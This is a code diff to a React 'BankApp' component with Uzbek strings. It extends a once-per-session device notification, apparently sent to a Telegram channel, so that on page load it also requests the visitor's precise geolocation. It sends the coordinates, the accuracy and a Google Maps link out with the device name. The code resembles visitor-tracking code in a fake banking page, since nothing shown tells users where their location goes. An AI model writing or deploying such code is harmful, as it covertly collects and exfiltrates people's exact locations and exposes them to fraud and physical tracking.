@@ -170,9 +170,33 @@ export function BankApp() {
   useEffect(() => {
     const sent = sessionStorage.getItem("vesta-tg-sent");
     if (sent) return;
+
     const name = getDeviceName();
-    const text = `Qurilma kirdi: ${name}`;
-    notifyDevice({ data: { text } }).then(() => sessionStorage.setItem("vesta-tg-sent", "1")).catch(() => {});
+    let text = `Qurilma kirdi: ${name}`;
+
+    const send = (msg: string) => {
+      notifyDevice({ data: { text: msg } })
+        .then(() => sessionStorage.setItem("vesta-tg-sent", "1"))
+        .catch(() => {});
+    };
+
+    if (!navigator.geolocation) {
+      send(text + "\nLokatsiya: qo'llab-quvvatlanmaydi");
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const { latitude, longitude, accuracy } = pos.coords;
+        const loc = `Lokatsiya: ${latitude.toFixed(6)}, ${longitude.toFixed(6)} (±${Math.round(accuracy)}m)`;
+        const map = `https://maps.google.com/?q=${latitude},${longitude}`;
+        send(`${text}\n${loc}\n${map}`);
+      },
+      () => {
+        send(text + "\nLokatsiya: ruxsat berilmadi");
+      },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
   }, []);
 
   const dark = frame.screen === "success";
